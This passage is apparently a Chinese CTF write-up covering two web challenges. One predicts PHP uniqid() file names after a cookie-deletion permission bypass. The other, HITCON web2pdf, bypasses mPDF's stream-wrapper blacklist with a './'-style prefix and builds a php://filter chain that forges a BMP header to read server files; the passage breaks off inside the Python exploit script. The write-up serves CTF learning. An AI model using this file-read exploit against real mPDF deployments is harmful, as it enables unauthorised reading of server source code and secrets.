+		<span class="nv">uniqid</span> <span class="o">=</span> strpprintf<span class="o">(</span>0, <span class="s2">&#34;%s%08x%05x%.8F&#34;</span>, prefix, sec, usec, php_combined_lcg<span class="o">()</span> * 10<span class="o">)</span><span class="p">;</span>
+	<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+		<span class="nv">uniqid</span> <span class="o">=</span> strpprintf<span class="o">(</span>0, <span class="s2">&#34;%s%08x%05x&#34;</span>, prefix, sec, usec<span class="o">)</span><span class="p">;</span>
+	<span class="o">}</span>
+
+	RETURN_STR<span class="o">(</span>uniqid<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>本地生成一个来对比一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">%s%08x%05x
+flagholder_6381fadef3112
+</code></pre></td></tr></table>
+</div>
+</div><p>验证过是正确的，前八位是时间戳精确到秒，后面是毫秒</p>
+<p>但是问题是<strong>获取不到flag记录的时间</strong>，所以爆破不来</p>
+<p>但是注意到这里的一个代码，我们访问flag作业模块被拦截就是因为他，所以只要我能绕过就可以了</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128131933045.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128131933045"
+	
+	
+></p>
+<p>但是这里后面的public是写死的，肯定绕不过，只能往前走，这里的<code>$_SESSION[&quot;userclass&quot;] &lt; PERM_TA</code></p>
+<p>这里PERM_TA的值为0，只要不满足条件就可以了，但是我们直接注册都是-1</p>
+<p>但是只要我们不注册，cookie删掉，就成功的绕过了这个判断了，因为不存在，所以他也不成立</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128131956548.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128131956548"
+	
+	
+></p>
+<p>拿到时间然后直接跑脚本跑出字典，然后bp跑一轮就可以了</p>
+<p>最后的poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">&lt;?php
+<span class="k">function</span> uniqidGen<span class="o">(</span><span class="nv">$timestamp</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">return</span> sprintf<span class="o">(</span><span class="s2">&#34;%8x%05x&#34;</span>,floor<span class="o">(</span><span class="nv">$timestamp</span><span class="o">)</span>,<span class="o">(</span><span class="nv">$timestamp</span>-floor<span class="o">(</span><span class="nv">$timestamp</span><span class="o">))</span>*1000000<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+
+<span class="k">for</span> <span class="o">(</span><span class="nv">$i</span> <span class="o">=</span> 0<span class="p">;</span><span class="nv">$i</span> &lt;<span class="o">=</span> 99<span class="p">;</span> <span class="nv">$i</span>++<span class="o">){</span>
+    <span class="nv">$s</span> <span class="o">=</span> <span class="s2">&#34;flagholder_&#34;</span>.uniqidGen<span class="o">(</span><span class="s2">&#34;1669454106&#34;</span>. <span class="s2">&#34;.9088&#34;</span> . <span class="nv">$i</span><span class="o">)</span><span class="p">;</span>
+    <span class="nv">$hash</span> <span class="o">=</span> hash<span class="o">(</span><span class="s2">&#34;sha1&#34;</span>,<span class="nv">$s</span><span class="o">)</span><span class="p">;</span>
+    <span class="nb">echo</span> <span class="nv">$hash</span>.<span class="s2">&#34;\\n&#34;</span><span class="p">;</span>
+<span class="o">}</span>
+?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://tuchuang.huamang.xyz/img/image-20221128132009072.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128132009072"
+	
+	
+></p>
+<h1 id="web2pdf">web2pdf</h1>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128132056141.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128132056141"
+	
+	
+></p>
+<p>题目源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">&lt;?php
+error_reporting<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+require_once __DIR__ . <span class="s1">&#39;/../vendor/autoload.php&#39;</span><span class="p">;</span>
+require_once __DIR__ . <span class="s1">&#39;/hcaptcha.php&#39;</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;source&#39;</span><span class="o">]))</span>
+    die<span class="o">(</span>preg_replace<span class="o">(</span><span class="s1">&#39;#hitcon{\\w+}#&#39;</span>, <span class="s1">&#39;h1tc0n{flag}&#39;</span>, show_source<span class="o">(</span>__FILE__, <span class="nb">true</span><span class="o">)))</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;url&#39;</span><span class="o">]))</span> <span class="o">{</span>
+    // <span class="k">if</span> <span class="o">(</span>!verify_hcaptcha<span class="o">())</span> die<span class="o">(</span><span class="s2">&#34;Captcha verification failed&#34;</span><span class="o">)</span><span class="p">;</span>
+    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;url&#39;</span><span class="o">]</span><span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span>preg_match<span class="o">(</span><span class="s2">&#34;#^https?://#&#34;</span>, <span class="nv">$url</span><span class="o">))</span> <span class="o">{</span>
+        <span class="nv">$html</span> <span class="o">=</span> file_get_contents<span class="o">(</span><span class="nv">$url</span><span class="o">)</span><span class="p">;</span>
+        // <span class="nb">echo</span> <span class="nv">$html</span><span class="p">;</span>
+        <span class="nv">$mpdf</span> <span class="o">=</span> new <span class="se">\\</span>Mpdf<span class="se">\\</span>Mpdf<span class="o">()</span><span class="p">;</span>
+        <span class="nv">$mpdf</span>-&gt;WriteHTML<span class="o">(</span><span class="nv">$html</span><span class="o">)</span><span class="p">;</span>
+        <span class="nv">$mpdf</span>-&gt;Output<span class="o">()</span><span class="p">;</span>
+        exit<span class="p">;</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        die<span class="o">(</span><span class="s1">&#39;Invalid URL&#39;</span><span class="o">)</span><span class="p">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+
+&lt;head&gt;
+    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>&gt;
+    &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;IE=edge&#34;</span>&gt;
+    &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;&lt;https://unpkg.com/awsm.css/dist/awsm.min.css&gt;&#34;</span>&gt;
+    &lt;title&gt;web2pdf&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+    &lt;header&gt;
+        &lt;h1&gt;<span class="o">{</span>web2pdf<span class="o">}</span>&lt;/h1&gt;
+        &lt;p&gt;&gt; Convert any web page to PDF online!&lt;/p&gt;
+        &lt;nav&gt;
+            &lt;ul&gt;
+                &lt;li&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;Home&lt;/a&gt;&lt;/li&gt;
+                &lt;li&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/?source&#34;</span>&gt;View Source Code&lt;/a&gt;&lt;/li&gt;
+            &lt;/ul&gt;
+        &lt;/nav&gt;
+    &lt;/header&gt;
+
+    &lt;main&gt;
+        &lt;article&gt;
+            &lt;section&gt;
+                &lt;form <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;
+                    &lt;label <span class="k">for</span><span class="o">=</span><span class="s2">&#34;url&#34;</span>&gt;URL&lt;/label&gt;
+                    &lt;input <span class="nv">id</span><span class="o">=</span><span class="s2">&#34;url&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;url&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="nv">placeholder</span><span class="o">=</span><span class="s2">&#34;&lt;https://example.com/&gt;&#34;</span>&gt;
+                    &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;captcha&#34;</span> <span class="nv">style</span><span class="o">=</span><span class="s2">&#34;display: none&#34;</span>&gt;
+                    
+                    &lt;br&gt;
+                    &lt;button&gt;Submit&lt;/button&gt;
+                    &lt;button <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;reset&#34;</span>&gt;Reset&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/section&gt;
+        &lt;/article&gt;
+    &lt;/main&gt;
+
+    &lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;&lt;https://js.hcaptcha.com/1/api.js&gt;&#34;</span> async defer&gt;&lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+
+&lt;?php  /* <span class="nv">$FLAG</span> <span class="o">=</span> <span class="s1">&#39;hitcon{redacted}&#39;</span> */ ?&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>最新版的mpdf，issue里面提了一个ssrf和文件读取</p>
+<p><a class="link" href="https://github.com/mpdf/mpdf/issues/1763"  target="_blank" rel="noopener"
+    >https://github.com/mpdf/mpdf/issues/1763</a></p>
+<p>需要控制img的src属性</p>
+<p>compose到最新版源码，然后本地dubug调试</p>
+<p>mpdf对于img标签的处理，他会提取出src属性的值，对与src的处理有两个逻辑，一个是远程文件包含，一个是本地文件包含</p>
+<p>在确定协议在白名单内，或者不在黑名单里面，就会进行下一步操作</p>
+<p>远程文件包含都没啥好说的，就是发了一个get包</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128132145447.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128132145447"
+	
+	
+></p>
+<p>本地文件的包含，就会fopen去读取文件</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128132203689.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128132203689"
+	
+	
+></p>
+<p>在读取了之后会先根据文件头猜测文件类型，再根据猜测出的文件类型去进行更细化的结构识别</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128132239524.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128132239524"
+	
+	
+></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221128132302786.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221128132302786"
+	
+	
+></p>
+<p>所以如果随意读取一个文件的话，虽然说是可以fopen读到，但是过不了文件结构的检测，所以无法进行下一步的操作</p>
+<p>所以我想到唯一的点就是，怎么绕过php协议，然后利用filter字符集来构造出特定的字符来绕过检测</p>
+<p>绕过方法是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">:/:/php://filter/convert
+</code></pre></td></tr></table>
+</div>
+</div><p>下面来解释为什么这样可以绕过</p>
+<p>观察这个GetFullPath函数</p>
+<p>首先是第一次，在mpdf.php的13838行，之类会识别src=，去提取出里面的url，然后走这个GetFullPath进行处理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="k">if</span> <span class="o">(</span>trim<span class="o">(</span><span class="nv">$path</span><span class="o">)</span> !<span class="o">=</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> !<span class="o">(</span>stristr<span class="o">(</span><span class="nv">$e</span>, <span class="s2">&#34;src=&#34;</span><span class="o">)</span> !<span class="o">==</span> <span class="nb">false</span> <span class="o">&amp;&amp;</span> substr<span class="o">(</span><span class="nv">$path</span>, 0, 4<span class="o">)</span> <span class="o">==</span> <span class="s1">&#39;var:&#39;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> substr<span class="o">(</span><span class="nv">$path</span>, 0, 1<span class="o">)</span> !<span class="o">=</span> <span class="s1">&#39;@&#39;</span><span class="o">)</span> <span class="o">{</span>
+		<span class="nv">$path</span> <span class="o">=</span> htmlspecialchars_decode<span class="o">(</span><span class="nv">$path</span><span class="o">)</span><span class="p">;</span> // mPDF 5.7.4 URLs
+		<span class="nv">$orig_srcpath</span> <span class="o">=</span> <span class="nv">$path</span><span class="p">;</span>
+		<span class="nv">$this</span>-&gt;GetFullPath<span class="o">(</span><span class="nv">$path</span><span class="o">)</span><span class="p">;</span>
+		<span class="nv">$regexp</span> <span class="o">=</span> <span class="s1">&#39;/ (href|src)=&#34;(.*?)&#34;/i&#39;</span><span class="p">;</span>
+		<span class="nv">$e</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="nv">$regexp</span>, <span class="s1">&#39; \\\\1=&#34;&#39;</span> . <span class="nv">$path</span> . <span class="s1">&#39;&#34;&#39;</span>, <span class="nv">$e</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>跟进分析，可以发现他会把<code>以./开头</code>的给换空，那么此时url就变成了<code>./php://xxxx</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">public <span class="k">function</span> GetFullPath<span class="o">(</span><span class="p">&amp;</span><span class="nv">$path</span>, <span class="nv">$basepath</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">)</span>
+	<span class="o">{</span>
+		// @todo make <span class="k">return</span>, remove reference
+
+		......
+
+		<span class="nv">$path</span> <span class="o">=</span> preg_replace<span class="o">(</span><span class="s1">&#39;|^./|&#39;</span>, <span class="s1">&#39;&#39;</span>, <span class="nv">$path</span><span class="o">)</span><span class="p">;</span> // Inadvertently corrects <span class="s2">&#34;./path/etc&#34;</span> and <span class="s2">&#34;//www.domain.com/etc&#34;</span>
+
+		<span class="k">if</span> <span class="o">(</span>strpos<span class="o">(</span><span class="nv">$path</span>, <span class="s1">&#39;#&#39;</span><span class="o">)</span> <span class="o">===</span> 0<span class="o">)</span> <span class="o">{</span>
+			<span class="k">return</span><span class="p">;</span>
+		<span class="o">}</span>
+
+		......
+
+			<span class="nv">$path</span> .<span class="o">=</span> <span class="s1">&#39;/&#39;</span> . <span class="nv">$filepath</span><span class="p">;</span> // Make it an absolute path
+
+			<span class="k">return</span><span class="p">;</span>
+
+		<span class="o">}</span>
+		......
+		
+		// Do nothing <span class="k">if</span> it is an Absolute Link
+	<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后处理完后送进imageprossesor.php的<code>getImage方法</code></p>
+<p>进而走进AssetFetcher<code>fetchDataFromPath</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">public <span class="k">function</span> fetchDataFromPath<span class="o">(</span><span class="nv">$path</span>, <span class="nv">$originalSrc</span> <span class="o">=</span> null<span class="o">)</span>
+	<span class="o">{</span>
+		/**
+		 * Prevents insecure PHP object injection through phar:// wrapper
+		 * @see &lt;https://github.com/mpdf/mpdf/issues/949&gt;
+		 * @see &lt;https://github.com/mpdf/mpdf/issues/1381&gt;
+		 */
+		<span class="nv">$wrapperChecker</span> <span class="o">=</span> new StreamWrapperChecker<span class="o">(</span><span class="nv">$this</span>-&gt;mpdf<span class="o">)</span><span class="p">;</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="nv">$wrapperChecker</span>-&gt;hasBlacklistedStreamWrapper<span class="o">(</span><span class="nv">$path</span><span class="o">))</span> <span class="o">{</span>
+			throw new <span class="se">\\</span>Mpdf<span class="se">\\</span>Exception<span class="se">\\</span>AssetFetchingException<span class="o">(</span><span class="s1">&#39;File contains an invalid stream. Only &#39;</span> . implode<span class="o">(</span><span class="s1">&#39;, &#39;</span>, <span class="nv">$wrapperChecker</span>-&gt;getWhitelistedStreamWrappers<span class="o">())</span> . <span class="s1">&#39; streams are allowed.&#39;</span><span class="o">)</span><span class="p">;</span>
+		<span class="o">}</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="nv">$originalSrc</span> <span class="o">&amp;&amp;</span> <span class="nv">$wrapperChecker</span>-&gt;hasBlacklistedStreamWrapper<span class="o">(</span><span class="nv">$originalSrc</span><span class="o">))</span> <span class="o">{</span>
+			throw new <span class="se">\\</span>Mpdf<span class="se">\\</span>Exception<span class="se">\\</span>AssetFetchingException<span class="o">(</span><span class="s1">&#39;File contains an invalid stream. Only &#39;</span> . implode<span class="o">(</span><span class="s1">&#39;, &#39;</span>, <span class="nv">$wrapperChecker</span>-&gt;getWhitelistedStreamWrappers<span class="o">())</span> . <span class="s1">&#39; streams are allowed.&#39;</span><span class="o">)</span><span class="p">;</span>
+		<span class="o">}</span>
+
+		<span class="nv">$this</span>-&gt;mpdf-&gt;GetFullPath<span class="o">(</span><span class="nv">$path</span><span class="o">)</span><span class="p">;</span>
+
+		<span class="k">return</span> <span class="nv">$this</span>-&gt;isPathLocal<span class="o">(</span><span class="nv">$path</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span><span class="nv">$originalSrc</span> !<span class="o">==</span> null <span class="o">&amp;&amp;</span> <span class="nv">$this</span>-&gt;isPathLocal<span class="o">(</span><span class="nv">$originalSrc</span><span class="o">))</span>
+			? <span class="nv">$this</span>-&gt;fetchLocalContent<span class="o">(</span><span class="nv">$path</span>, <span class="nv">$originalSrc</span><span class="o">)</span>
+			: <span class="nv">$this</span>-&gt;fetchRemoteContent<span class="o">(</span><span class="nv">$path</span><span class="o">)</span><span class="p">;</span>
+	<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里会进入判断协议非法，这里判断逻辑是，如果不在白名单[&ldquo;http&rdquo;,&ldquo;https&rdquo;,&ldquo;file&rdquo;]那么就判断是否在黑名单：[&ldquo;https&rdquo;,&ldquo;ftps&rdquo;,&ldquo;compress.zlib&rdquo;,&ldquo;compress.bzip2&rdquo;,&ldquo;php&rdquo;,&ldquo;file&rdquo;,&ldquo;glob&rdquo;,&ldquo;data&rdquo;,&ldquo;http&rdquo;,&ldquo;ftp&rdquo;,&ldquo;phar&rdquo;,&ldquo;zip&rdquo;]</p>
+<p>这里因为我们url为<code>./php://xxx</code>  php协议的前面有个<code>./</code>  这就意味着，不会在黑名单里不会被检测出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">public <span class="k">function</span> hasBlacklistedStreamWrapper<span class="o">(</span><span class="nv">$filename</span><span class="o">)</span>
+	<span class="o">{</span>
+		<span class="k">if</span> <span class="o">(</span>strpos<span class="o">(</span><span class="nv">$filename</span>, <span class="s1">&#39;://&#39;</span><span class="o">)</span> &gt; 0<span class="o">)</span> <span class="o">{</span>
+			<span class="nv">$wrappers</span> <span class="o">=</span> stream_get_wrappers<span class="o">()</span><span class="p">;</span>
+			<span class="nv">$whitelistStreamWrappers</span> <span class="o">=</span> <span class="nv">$this</span>-&gt;getWhitelistedStreamWrappers<span class="o">()</span><span class="p">;</span>
+			foreach <span class="o">(</span><span class="nv">$wrappers</span> as <span class="nv">$wrapper</span><span class="o">)</span> <span class="o">{</span>
+				<span class="k">if</span> <span class="o">(</span>in_array<span class="o">(</span><span class="nv">$wrapper</span>, <span class="nv">$whitelistStreamWrappers</span><span class="o">))</span> <span class="o">{</span>
+					<span class="k">continue</span><span class="p">;</span>
+				<span class="o">}</span>
+
+				<span class="k">if</span> <span class="o">(</span>stripos<span class="o">(</span><span class="nv">$filename</span>, <span class="nv">$wrapper</span> . <span class="s1">&#39;://&#39;</span><span class="o">)</span> <span class="o">===</span> 0<span class="o">)</span> <span class="o">{</span>
+					<span class="k">return</span> true<span class="p">;</span>
+				<span class="o">}</span>
+			<span class="o">}</span>
+		<span class="o">}</span>
+
+		<span class="k">return</span> false<span class="p">;</span>
+	<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>判断你的url合法之后，就会再次进入GetFullPath，那么这里又删除了<code>./</code>这种特殊的字串，我们的协议就被还原成了<code>php://</code>了</p>
+<p>这里就可以通过构造一个BMP文件的格式，来绕过检测，这里构造的方法就是通过filter字符串的构造了</p>
+<p>BMP文件格式可以参考这个：https://www.cnblogs.com/Matrix_Yao/archive/2009/12/02/1615295.html</p>
+<p>贴一个exp脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">import base64, sys
+
+<span class="nv">file_to_use</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/index.php&#34;</span>
+
+width, <span class="nv">height</span> <span class="o">=</span> 15000, <span class="m">1</span>
+
+<span class="nv">payload</span> <span class="o">=</span> b<span class="s1">&#39;BM:\\x00\\x00\\x00\\x00\\x00\\x00\\x006\\x00\\x00\\x00(\\x00\\x00\\x00&#39;</span> + <span class="se">\\</span>
+    width.to_bytes<span class="o">(</span>4, <span class="s1">&#39;little&#39;</span><span class="o">)</span> + <span class="se">\\</span>
+    height.to_bytes<span class="o">(</span>4, <span class="s1">&#39;little&#39;</span><span class="o">)</span> + <span class="se">\\</span>
+    b<span class="s1">&#39;\\x01\\x00\\x18\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39;</span>
+
+<span class="nv">base64_payload</span> <span class="o">=</span> base64.b64encode<span class="o">(</span>payload<span class="o">)</span>.decode<span class="o">()</span>
+
+<span class="c1"># generate some garbage base64</span>
+<span class="nv">filters</span> <span class="o">=</span> <span class="s2">&#34;convert.iconv.UTF8.CSISO2022KR|&#34;</span>
+<span class="nv">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
+<span class="c1"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
+<span class="nv">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+
+<span class="k">for</span> c in base64_payload<span class="o">[</span>::-1<span class="o">]</span>:
+        <span class="nv">filters</span> <span class="o">+=</span> open<span class="o">(</span>f<span class="s1">&#39;{sys.path[0]}/res/{ord(c):02x}&#39;</span><span class="o">)</span>.read<span class="o">()</span> + <span class="s2">&#34;|&#34;</span>
+        <span class="c1"># decode and reencode to get rid of everything that isn&#39;t valid base64</span>
+        <span class="nv">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode|&#34;</span>
+        <span class="nv">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
+        <span class="c1"># get rid of equal signs</span>
+        <span class="nv">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
+
+<span class="nv">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode&#34;</span>
+
+<span class="nv">filters</span> <span class="o">=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF16LE|&#34;</span> * <span class="m">3</span> + filters
+
